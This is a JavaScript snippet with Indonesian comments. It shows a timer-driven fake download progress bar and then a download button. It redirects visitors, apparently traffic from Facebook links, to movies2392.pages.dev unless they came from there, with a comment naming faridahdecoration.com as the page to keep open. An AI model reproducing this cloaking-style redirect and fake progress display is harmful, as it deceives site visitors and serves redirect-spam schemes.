    // Mendapatkan elemen progress bar
    var progressBar = document.querySelector('.progress-bar');
    // Mendapatkan elemen tombol download
    var downloadButtonContainer = document.getElementById('button-container');

    // Membuat fungsi untuk menganimasikan progress bar
    function animateProgressBar() {
        var width = 1; // Nilai awal lebar progress bar
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval); // Menghentikan interval jika lebar sudah mencapai 100%
                downloadButtonContainer.style.display = 'block'; // Menampilkan tombol download
            } else {
                width++; // Meningkatkan nilai lebar progress bar
                progressBar.style.width = width + '%'; // Mengatur lebar progress bar
                progressBar.innerText = width + '%'; // Menampilkan angka persentase di dalam progress bar
                progressBar.setAttribute('aria-valuenow', width); // Mengatur nilai persentase untuk aksesibilitas
            }
        }, 50); // Interval animasi
    }

    // Memanggil fungsi untuk memulai animasi progress bar
    animateProgressBar();

// Fungsi untuk mendapatkan parameter dari URL
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

// Mengambil nilai parameter 'fbclid' dari URL
var fbclid = getParameterByName('fbclid');

// Mengambil domain utama (tanpa protokol)
var mainDomain = window.location.hostname.split('.').slice(-2).join('.');

// Jika pengunjung akses langsung dengan parameter 'reload' atau hasilnya dari redirect dari https://movies2392.pages.dev,
// maka tidak ada redirect, biarkan web https://www.faridahdecoration.com terbuka
if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain) {
    // Tidak melakukan redirect
} else {
    // Jika tidak langsung akses atau reload sudah dilakukan sebelumnya, maka redirect ke https://movies2392.pages.dev
    window.location.href = "https://movies2392.pages.dev";
}

// Fungsi untuk reload halaman
function reloadPage() {
    // Cek apakah parameter 'reload' sudah ada dalam URL
    var isReloaded = getParameterByName('reload');
    // Jika belum ada, lakukan reload
    if (!isReloaded) {
        // Tambahkan parameter 'reload' ke URL untuk menandai bahwa reload sudah dilakukan
        window.location.href = window.location.href + '?reload=true';
        location.reload(); // Memuat ulang halaman
    }
}






